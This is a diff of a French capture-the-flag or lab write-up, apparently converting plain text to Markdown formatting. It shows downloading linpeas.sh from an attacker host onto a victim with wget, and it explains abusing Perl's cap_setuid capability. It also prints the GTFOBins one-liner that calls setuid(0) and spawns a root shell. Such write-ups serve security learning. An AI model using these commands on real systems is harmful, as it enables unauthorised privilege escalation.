@@ -80,14 +80,17 @@ wget http://IP_ATTAQUANT:8000/linpeas.sh # Sur la victime
 chmod +x linpeas.sh
 ./linpeas.sh
 ```
-LinPEAS identifie que l'interpréteur Perl possède des "capabilities" étendues (cap_setuid+ep).
+LinPEAS identifie que l'interpréteur `perl` possède des "capabilities" étendues (`cap_setuid+ep`).
 
-Explication de la vulnérabilité
-La capability CAP_SETUID permet au binaire de manipuler son propre UID (User ID). Si elle est définie sur un binaire comme Perl, elle peut être utilisée comme une backdoor pour devenir root.
+### Explication de la vulnérabilité
+La capability `CAP_SETUID` permet au binaire de manipuler son propre UID (User ID). Si elle est définie sur un binaire comme `perl`, elle peut être utilisée comme une backdoor pour devenir `root`.
 
-Exploitation
-Nous utilisons une commande issue de GTFOBins pour exploiter cette capability :
+### Exploitation
+Nous utilisons une commande issue de **GTFOBins** pour exploiter cette capability :
+
+```bash
 perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+```
 perl -e : Exécute le script suivant.
 
 use POSIX qw(setuid); : Importe la fonction setuid.
